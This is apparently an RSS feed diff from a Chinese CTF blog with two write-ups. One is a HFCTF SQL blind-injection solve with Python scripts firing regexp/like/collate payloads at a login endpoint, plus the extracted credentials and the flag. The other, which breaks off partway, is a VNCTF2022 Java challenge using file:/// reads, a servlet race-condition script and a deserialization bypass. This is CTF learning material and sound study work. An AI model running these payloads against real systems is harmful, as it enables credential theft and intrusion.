+			srcset=&#34;https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320213203235_hucb36d1bdae76aadff29389b7cec70923_10350_480x0_resize_box_3.png 480w, https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320213203235_hucb36d1bdae76aadff29389b7cec70923_10350_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20220320213203235&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220320213203235&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;然后就可以愉快写脚本盲注啦~&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import requests
+
+passwd=&amp;quot;&amp;quot;
+lista=&amp;quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&amp;quot;
+while True:
+    for i in lista:
+        exp=&amp;quot;&#39;or`password`regexp&#39;^&amp;quot;+passwd+i+&amp;quot;&#39;or`password`regexp&#39;[&amp;quot;
+        #print(exp)
+        data={&amp;quot;username&amp;quot;:exp,&amp;quot;password&amp;quot;:&amp;quot;123456&amp;quot;}
+        res = requests.post(&amp;quot;http://47.107.231.226:36804/login&amp;quot;,data=data)
+       #print(res.text)
+        if(&#39;401&#39; in res.text):
+            passwd+=i
+            print(passwd)
+            break
+            
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;同样对username进行盲注，得到的结果如下：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;username: QAY8TEFYZC67AEOO
+password: M52FPLDXYYLB
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;但是感觉有些奇怪，一时说不上来奇怪在哪里&amp;hellip;所以尝试拿去登录了一下。&lt;/p&gt;
+&lt;p&gt;啊哦，是错的。所以重新去看哪里有问题（其实也没有去看，当时在和高表哥通电话，他提点了一下，嘿嘿，化腐朽为神奇的好大哥~）&lt;/p&gt;
+&lt;p&gt;重新看一遍hint.md，仔细看过滤的地方。&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-javasc&#34;&gt;function safe(str: string): string {
+  const r = str
+    .replace(/[\s,()#;*\-]/g, &#39;&#39;)
+    .replace(/^.*(?=union|binary).*$/gi, &#39;&#39;)
+    .toString();
+  return r;
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;发现除了union被过滤，还有一个binary。binary关键字在mysql里用来区分大小写，mysql默认是不区分大小写的。看下面的例子。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 111; 
+			flex-basis: 268px&#34;
+	&gt;
+	&lt;a href=&#34;https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320214957473.png&#34; data-size=&#34;678x606&#34;&gt;
+		&lt;img src=&#34;https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320214957473.png&#34;
+			width=&#34;678&#34;
+			height=&#34;606&#34;
+			srcset=&#34;https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320214957473_huc243a74311b13de2c63ac97838a57c7c_26721_480x0_resize_box_3.png 480w, https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320214957473_huc243a74311b13de2c63ac97838a57c7c_26721_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20220320214957473&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220320214957473&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;但是现在binary被过滤了，只能另寻他路。&lt;/p&gt;
+&lt;p&gt;经过一番搜寻，发现&lt;code&gt;collate&lt;/code&gt;也可以做到让mysql区分大小写。这里就涉及到mysql默认字符集的问题。&lt;/p&gt;
+&lt;h4 id=&#34;mysql字符集&#34;&gt;MySQL字符集&lt;/h4&gt;
+&lt;p&gt;在我们的认知里，基本上字符的比较都是通过先转换成ascii，再根据ascii字符集进行比较；特别的，像php那样的弱类型比较，如果字符和数字进行比较会先把字符转换成0。下面来看mysql特殊的例子。首先知道&amp;rsquo;a&amp;rsquo;对应的ascii是97，&amp;lsquo;8&amp;rsquo;对应的ascii是56，&amp;rsquo;@&amp;lsquo;对应的ascii是64，&amp;rsquo;~&amp;lsquo;对应的ascii是126。如果对这几个字符进行比较，我们的第一反应应该是 &lt;code&gt;&#39;~&#39;&amp;gt;&#39;a&#39;&amp;gt;&#39;@&#39;&amp;gt;&#39;8&#39;&lt;/code&gt;。但是看一下在mysql里运行的结果。&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-mysql&#34;&gt;mysql&amp;gt; select &#39;a&#39;&amp;gt;&#39;1&#39;;
++---------+
+| &#39;a&#39;&amp;gt;&#39;1&#39; |
++---------+
+|       1 |
++---------+
+1 row in set (0.05 sec)
+
+mysql&amp;gt; select &#39;@&#39;&amp;gt;&#39;a&#39;;
++---------+
+| &#39;@&#39;&amp;gt;&#39;a&#39; |
++---------+
+|       0 |
++---------+
+1 row in set (0.00 sec)
+
+mysql&amp;gt; select &#39;@&#39;&amp;gt;&#39;8&#39;;
++---------+
+| &#39;@&#39;&amp;gt;&#39;8&#39; |
++---------+
+|       0 |
++---------+
+1 row in set (0.00 sec)
+
+mysql&amp;gt; select &#39;~&#39;&amp;gt;&#39;a&#39;;
++---------+
+| &#39;~&#39;&amp;gt;&#39;a&#39; |
++---------+
+|       0 |
++---------+
+1 row in set (0.05 sec)
+
+mysql&amp;gt; select &#39;~&#39;&amp;gt;&#39;8&#39;;
++---------+
+| &#39;~&#39;&amp;gt;&#39;8&#39; |
++---------+
+|       0 |
++---------+
+1 row in set (0.00 sec)
+
+mysql&amp;gt; select &#39;@&#39;&amp;gt;&#39;a&#39;;
++---------+
+| &#39;@&#39;&amp;gt;&#39;a&#39; |
++---------+
+|       0 |
++---------+
+1 row in set (0.00 sec)
+
+mysql&amp;gt; select &#39;@&#39;&amp;gt;&#39;8&#39;;
++---------+
+| &#39;@&#39;&amp;gt;&#39;8&#39; |
++---------+
+|       0 |
++---------+
+1 row in set (0.00 sec)
+
+mysql&amp;gt; select &#39;a&#39;&amp;gt;&#39;8&#39;;
++---------+
+| &#39;a&#39;&amp;gt;&#39;8&#39; |
++---------+
+|       1 |
++---------+
+1 row in set (0.00 sec)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;很奇怪，这和我们的直觉不符，和二师傅、nkk以及远方的高表哥在实验室探讨了很久这个问题。最后发现其实是字符集的锅。&lt;/p&gt;
+&lt;p&gt;mysql8把默认字符集换成了&lt;code&gt;utf8mb4_0900_ai_ci&lt;/code&gt;，可以查询看看。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 250; 
+			flex-basis: 600px&#34;
+	&gt;
+	&lt;a href=&#34;https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320221936369.png&#34; data-size=&#34;495x198&#34;&gt;
+		&lt;img src=&#34;https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320221936369.png&#34;
+			width=&#34;495&#34;
+			height=&#34;198&#34;
+			srcset=&#34;https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320221936369_hua91a6c7d0528e5b37b54531ed9097120_16522_480x0_resize_box_3.png 480w, https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320221936369_hua91a6c7d0528e5b37b54531ed9097120_16522_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20220320221936369&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220320221936369&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;二师傅搜到这个&lt;a class=&#34;link&#34; href=&#34;http://www.unicode.org/Public/UCA/9.0.0/allkeys.txt&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;字符集&lt;/a&gt;，发现它默认是把一些特殊的字符放在了数字和字母的前面，像我们用到的 &amp;lsquo;@&amp;lsquo;和&amp;rsquo;~&amp;rsquo; 在这个字符集里都是比数字和字母小的，所以得到了上面的结果。以及，附上对于这个字符集的&lt;a class=&#34;link&#34; href=&#34;https://www.monolune.com/articles/what-is-the-utf8mb4_0900_ai_ci-collation/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;说明&lt;/a&gt;。感谢@二师傅。&lt;/p&gt;
+&lt;p&gt;说回区分大小写的问题，这个字符集带着&lt;code&gt;ci&lt;/code&gt;，说明是不区分大小写的，那么我们就可以通过修改mysql使用的字符集来实现这个功能。这里找一个能够区分大小写的字符集就可以。&lt;/p&gt;
+&lt;p&gt;所以修改一下sql语句：&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 228; 
+			flex-basis: 547px&#34;
+	&gt;
+	&lt;a href=&#34;https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320224045559.png&#34; data-size=&#34;1188x521&#34;&gt;
+		&lt;img src=&#34;https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320224045559.png&#34;
+			width=&#34;1188&#34;
+			height=&#34;521&#34;
+			srcset=&#34;https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320224045559_hu1abf5b3959402044629532329d24ca31_54313_480x0_resize_box_3.png 480w, https://example.com/2022/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E5%AD%A6redos%E5%8F%8Asql%E7%9B%B2%E6%B3%A8/image-20220320224045559_hu1abf5b3959402044629532329d24ca31_54313_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20220320224045559&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220320224045559&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;这里注意，这个collate要接在待比较或者匹配字符语句的后面。像上面的语句，如果接在最后是不起作用的。&lt;/p&gt;
+&lt;p&gt;到这里就可以实现区分大小写的功能了。但是最后注出的密码还是不对，考虑到可能是存在特殊字符，高表哥试了很多个最后试出来存在的特殊字符是&lt;code&gt;^$!&lt;/code&gt;。这里既然存在&lt;code&gt;^&lt;/code&gt;，这在正则表达式里面是关键字符，所以不能用regexp去注入，最后换成like解决了这个问题。&lt;/p&gt;
+&lt;p&gt;附上完整脚本。&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import requests
+
+a=&amp;quot;&amp;quot;
+passwd=&amp;quot;&amp;quot;
+lista=&amp;quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789$!^&amp;quot;
+while True:
+    for i in lista:
+        exp=&amp;quot;&#39;or`password`like&#39;&amp;quot;+passwd+i+&amp;quot;%&#39;collate&#39;utf8mb4_bin&#39;or`username`regexp&#39;[&amp;quot;
+        data={&amp;quot;username&amp;quot;:exp,&amp;quot;password&amp;quot;:&amp;quot;123456&amp;quot;}
+        res = requests.post(&amp;quot;http://47.107.231.226:36804/login&amp;quot;,data=data)
+        if(&#39;401&#39; in res.text):
+            passwd+=i
+            print(passwd)
+            break
+            
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;最后的结果是&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;username: QaY8TeFYzC67aeoO
+password: m52FPlDxYyLB^eIzAr!8gxh$
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;拿着去登录，返回flag。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;HFCTF{0990de0f-a5ea-4c47-90f7-7c92ba1eac80}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;参考资料&#34;&gt;参考资料&lt;/h3&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;Regular expression Denial of Service - ReDoS&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.freebuf.com/column/201766.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;正则表达式所引发的DoS攻击（Redos）&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/qcloud1001/p/10033364.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;MYSQL中的COLLATE是什么？ &lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&#34;写在最后&#34;&gt;写在最后&lt;/h3&gt;
+&lt;p&gt;拿一血的高表哥，yyds！&lt;/p&gt;
+&lt;p&gt;还是要多练多练多练多练多练多练多练，知道的东西越多在比赛里越得心应手，查资料也不会没有方向。写这道题的过程还是比较坎坷的，从不知道怎么绕过滤，到不知道怎么用正则，到不知道怎么区分大小写；中间写脚本的时候遇到了很多奇怪的问题，比如如果修改了字符集用大于小于号去比较的话应该用什么字符集呢（因为我和nkk倔强地想用大于小于号去比较2333333）。但是这些问题留待以后再探讨吧！&lt;/p&gt;
+&lt;p&gt;赶作业去嘞~&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>VNctf2022-easyJava</title>
+        <link>https://example.com/2022/vnctf2022-easyjava/</link>
+        <pubDate>Fri, 04 Mar 2022 00:00:00 +0000</pubDate>
+        
+        <guid>https://example.com/2022/vnctf2022-easyjava/</guid>
+        <description>&lt;h3 id=&#34;写在前面&#34;&gt;写在前面&lt;/h3&gt;
+&lt;p&gt;第一次把java的题从头到尾做完，整完的时候发现题目并不难。过程中还是学到了很多东西，感谢高表哥和nkk和二师傅🙇‍&lt;/p&gt;
+&lt;p&gt;比赛的时候没有做出来，环境关掉了，虽然buu有复现环境，但是由于需要竞争，buu有限制，所以把源码拿下来在本地搭。&lt;/p&gt;
+&lt;h3 id=&#34;复现&#34;&gt;复现&lt;/h3&gt;
+&lt;p&gt;打开环境，F12查看源码&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 132; 
+			flex-basis: 316px&#34;
+	&gt;
+	&lt;a href=&#34;https://example.com/2022/vnctf2022-easyjava/image-20220302133247566.png&#34; data-size=&#34;627x475&#34;&gt;
+		&lt;img src=&#34;https://example.com/2022/vnctf2022-easyjava/image-20220302133247566.png&#34;
+			width=&#34;627&#34;
+			height=&#34;475&#34;
+			srcset=&#34;https://example.com/2022/vnctf2022-easyjava/image-20220302133247566_hu577237c865eb4f6abda76ece1a65195e_30892_480x0_resize_box_3.png 480w, https://example.com/2022/vnctf2022-easyjava/image-20220302133247566_hu577237c865eb4f6abda76ece1a65195e_30892_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20220302133247566&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220302133247566&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;访问/file?&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 291; 
+			flex-basis: 698px&#34;
+	&gt;
+	&lt;a href=&#34;https://example.com/2022/vnctf2022-easyjava/image-20220302133312575.png&#34; data-size=&#34;428x147&#34;&gt;
+		&lt;img src=&#34;https://example.com/2022/vnctf2022-easyjava/image-20220302133312575.png&#34;
+			width=&#34;428&#34;
+			height=&#34;147&#34;
+			srcset=&#34;https://example.com/2022/vnctf2022-easyjava/image-20220302133312575_hub564c1c00095b999ecbc42c3dee3dbb9_9145_480x0_resize_box_3.png 480w, https://example.com/2022/vnctf2022-easyjava/image-20220302133312575_hub564c1c00095b999ecbc42c3dee3dbb9_9145_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20220302133312575&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220302133312575&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;需要传入一个url，猜测是需要用到伪协议任意读文件。于是传入&lt;code&gt;file:///&lt;/code&gt;读到源码。本地的话直接知道源码路径，就不多说了。比赛的时候是远程环境，我一开始不知道web部署在哪里，所以找了很久，最后在这个路径里找到。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/file?url=file:///usr/local/tomcat/&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;看到高表哥是通过当前运行进程去找的，这样找好像快一些，记录一下。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;/file?url=file:///proc/self/cwd/&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;然后看到tomcat的目录结构，进webapps，拿到源码拿去反编译。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 136; 
+			flex-basis: 326px&#34;
+	&gt;
+	&lt;a href=&#34;https://example.com/2022/vnctf2022-easyjava/image-20220302134240641.png&#34; data-size=&#34;301x221&#34;&gt;
+		&lt;img src=&#34;https://example.com/2022/vnctf2022-easyjava/image-20220302134240641.png&#34;
+			width=&#34;301&#34;
+			height=&#34;221&#34;
+			srcset=&#34;https://example.com/2022/vnctf2022-easyjava/image-20220302134240641_hu7b0b6a9bd2b5e77224803dc939a20160_11013_480x0_resize_box_3.png 480w, https://example.com/2022/vnctf2022-easyjava/image-20220302134240641_hu7b0b6a9bd2b5e77224803dc939a20160_11013_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20220302134240641&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220302134240641&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;HelloWorldServlet类&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;package servlet;
+
+import entity.User;
+import java.io.IOException;
+import java.util.Base64;
+import javax.servlet.ServletException;
+import javax.servlet.ServletOutputStream;
+import javax.servlet.annotation.WebServlet;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import util.Secr3t;
+import util.SerAndDe;
+
+@WebServlet(name = &amp;quot;HelloServlet&amp;quot;, urlPatterns = {&amp;quot;/evi1&amp;quot;})
+/* loaded from: HelloWorldServlet.class */
+public class HelloWorldServlet extends HttpServlet {
+    private volatile String name = &amp;quot;m4n_q1u_666&amp;quot;;
+    private volatile String age = &amp;quot;666&amp;quot;;
+    private volatile String height = &amp;quot;180&amp;quot;;
+    User user;
+
+    public void init() throws ServletException {
+        this.user = new User(this.name, this.age, this.height);
+    }
+
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
+        String reqName = req.getParameter(&amp;quot;name&amp;quot;);
+        if (reqName != null) {
+            this.name = reqName;
+        }
+        if (Secr3t.check(this.name)) {
+            Response(resp, &amp;quot;no vnctf2022!&amp;quot;);
+        } else if (Secr3t.check(this.name)) {
+            Response(resp, &amp;quot;The Key is &amp;quot; + Secr3t.getKey());
+        }
+    }
+
+    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
+        String key = req.getParameter(&amp;quot;key&amp;quot;);
+        String text = req.getParameter(&amp;quot;base64&amp;quot;);
+        if (!Secr3t.getKey().equals(key) || text == null) {
+            Response(resp, &amp;quot;KeyError&amp;quot;);
+            return;
+        }
+        if (this.user.equals((User) SerAndDe.deserialize(Base64.getDecoder().decode(text)))) {
+            Response(resp, &amp;quot;Deserialize…… Flag is &amp;quot; + Secr3t.getFlag().toString());
+        }
+    }
+
+    private void Response(HttpServletResponse resp, String outStr) throws IOException {
+        ServletOutputStream out = resp.getOutputStream();
+        out.write(outStr.getBytes());
+        out.flush();
+        out.close();
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;看到这里发现这个key通过正常手段没有办法拿到，不管怎样都不可能进else的。开始思考有没有别的办法。查阅了一些资料&lt;del&gt;问高表哥之后&lt;/del&gt;发现这里需要条件竞争。至于为什么可以竞争，二师傅的猜测加上我的理解再加上y4师傅的&lt;a class=&#34;link&#34; href=&#34;https://blog.csdn.net/solitudi/article/details/122781947?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164628358416780271539864%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;amp;request_id=164628358416780271539864&amp;amp;biz_id=0&amp;amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-122781947.nonecase&amp;amp;utm_term=servlet&amp;amp;spm=1018.2226.3001.4450&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;总结&lt;/a&gt;，大概就是&lt;strong&gt;servlet在一段时间内只实例化一次，导致多个用户会同时访问到同一个实例&lt;/strong&gt;，所以抢在某个servlet实例销毁之前对其进行修改，就可以实现下面两个条件同时满足的情况，进而拿到这个key。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 481; 
+			flex-basis: 1155px&#34;
+	&gt;
+	&lt;a href=&#34;https://example.com/2022/vnctf2022-easyjava/image-20220303215240491.png&#34; data-size=&#34;525x109&#34;&gt;
+		&lt;img src=&#34;https://example.com/2022/vnctf2022-easyjava/image-20220303215240491.png&#34;
+			width=&#34;525&#34;
+			height=&#34;109&#34;
+			srcset=&#34;https://example.com/2022/vnctf2022-easyjava/image-20220303215240491_hu61e8cb75c74514a0672b28dbdb8ff297_7713_480x0_resize_box_3.png 480w, https://example.com/2022/vnctf2022-easyjava/image-20220303215240491_hu61e8cb75c74514a0672b28dbdb8ff297_7713_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20220303215240491&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220303215240491&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;附上写好的垃圾脚本。&lt;/p&gt;
+&lt;p&gt;a.py&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import requests
+host = &amp;quot;http://localhost:8080/evi1&amp;quot;
+while True:
+    r = requests.get(host+&amp;quot;?name=qertyyui&amp;quot;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;b.py&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import requests
+host = &amp;quot;http://localhost:8080/evi1&amp;quot;
+while True:
+    r = requests.get(host+&amp;quot;?name=vnctf2022&amp;quot;)
+    if r.text.find(&amp;quot;The Key is&amp;quot;)!=-1:
+        print(r.text)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;拿到key。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; 这里在第二次复现的时候出了一点问题。问题大概出在python的request，在发起请求之后不会自动关闭连接，如果短时间内发起请求过多的话会一直占用Httpconnnectionpool的资源，导致之后发起的请求没有办法成功连接。尝试了很多办法都没有结局，不论是加header的connection为close，还是控制session，都没有用。最后采用多线程的办法才解决。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;接着往下就是反序列化，这里需要post一个key和base64，其中base64是一个User类序列化之后经过base64编码的结果。SerAndDe类里面提供了序列化和反序列化的方法封装，可以直接拿来用。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 451; 
+			flex-basis: 1083px&#34;
+	&gt;
+	&lt;a href=&#34;https://example.com/2022/vnctf2022-easyjava/image-20220303220931037.png&#34; data-size=&#34;1002x222&#34;&gt;
+		&lt;img src=&#34;https://example.com/2022/vnctf2022-easyjava/image-20220303220931037.png&#34;
+			width=&#34;1002&#34;
+			height=&#34;222&#34;
+			srcset=&#34;https://example.com/2022/vnctf2022-easyjava/image-20220303220931037_hu5e7ca04bd1651fd08b88581fc5a4c0aa_20526_480x0_resize_box_3.png 480w, https://example.com/2022/vnctf2022-easyjava/image-20220303220931037_hu5e7ca04bd1651fd08b88581fc5a4c0aa_20526_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20220303220931037&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220303220931037&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;注意到这里的&lt;code&gt;this.user&lt;/code&gt;，我们反序列化出来的User需要和&lt;code&gt;this.user&lt;/code&gt;相等。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 345; 
+			flex-basis: 829px&#34;
+	&gt;
+	&lt;a href=&#34;https://example.com/2022/vnctf2022-easyjava/image-20220304093202982.png&#34; data-size=&#34;553x160&#34;&gt;
+		&lt;img src=&#34;https://example.com/2022/vnctf2022-easyjava/image-20220304093202982.png&#34;
+			width=&#34;553&#34;
+			height=&#34;160&#34;
+			srcset=&#34;https://example.com/2022/vnctf2022-easyjava/image-20220304093202982_hu4656b423f200afa2e7b7ea7c1aa4f94b_11450_480x0_resize_box_3.png 480w, https://example.com/2022/vnctf2022-easyjava/image-20220304093202982_hu4656b423f200afa2e7b7ea7c1aa4f94b_11450_1024x0_resize_box_3.png 1024w&#34;
+			loading=&#34;lazy&#34;
+			alt=&#34;image-20220304093202982&#34;&gt;
+	&lt;/a&gt;
+	
+	&lt;figcaption&gt;image-20220304093202982&lt;/figcaption&gt;
+	
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;那么进User类看看。&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-java&#34;&gt;package entity;
+
+import java.io.IOException;
+import java.io.ObjectInputStream;
+import java.io.Serializable;
+
+/* loaded from: User.class */
+public class User implements Serializable {
+    private String name;
+    private String age;
+    private transient String height;
+
+    public User(String name, String age, String height) {
+        this.name = name;
+        this.age = age;
+        this.height = height;
+    }
+
+    public String getName() {
+        return this.name;
+    }
+
+    public void setName(String name) {
+        this.name = name;
+    }
+
+    public String getAge() {
+        return this.age;
+    }
+
+    public void setAge(String age) {
+        this.age = age;
+    }
+
+    public String getHeight() {
+        return this.height;
+    }
+
+    public void setHeight(String height) {
+        this.height = height;
+    }
+
+    private void readObject(ObjectInputStream s) throws IOException, ClassNotFoundException {
+        s.defaultReadObject();
+        this.height = (String) s.readObject();
+    }
+
+    @Override // java.lang.Object
+    public boolean equals(Object obj) {
+        if (obj == null) {
+            return false;
+        }
+        if (this == obj) {
+            return true;
+        }
+        if (!(obj instanceof User)) {
+            return false;
+        }
+        User user = (User) obj;
+        if (!user.getAge().equals(this.age) || !user.getHeight().equals(this.height) || !user.getName().equals(this.name)) {
+            return false;
+        }
+        return true;
+    }
+
+    @Override // java.lang.Object
+    public String toString() {
+        return &amp;quot;User{name=&#39;&amp;quot; + this.name + &amp;quot;&#39;, age=&#39;&amp;quot; + this.age + &amp;quot;&#39;, height=&#39;&amp;quot; + this.height + &amp;quot;&#39;}&amp;quot;;
+    }
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;这里有一个知识点，对于序列化和反序列化的时候，被&lt;code&gt;transient&lt;/code&gt;修饰的变量是不会被序列化的，所以如果不作任何更改序列化出来的字符串再拿去反序列化，得到的height会是个null，这样就没有办法满足if条件，拿不到flag。所以为了反序列化出来时，这个height和&lt;code&gt;this.user&lt;/code&gt;里面的height是一致的，可以通过重写writeObject方法，手动把height写进我们反序列化出来的对象里。&lt;/p&gt;
+&lt;p&gt;&lt;figure 
+	
+		class=&#34;gallery-image&#34; 
+		style=&#34;
+			flex-grow: 602; 
+			flex-basis: 1444px&#34;
+	&gt;
